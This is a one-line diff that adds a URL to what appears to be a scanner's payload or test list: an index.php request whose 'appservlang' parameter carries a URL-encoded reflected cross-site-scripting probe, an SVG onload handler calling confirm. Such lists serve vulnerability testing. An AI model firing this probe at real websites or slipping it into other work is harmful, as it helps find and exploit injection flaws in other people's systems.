@@ -1,0 +1,1 @@
+/index.php?appservlang=%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
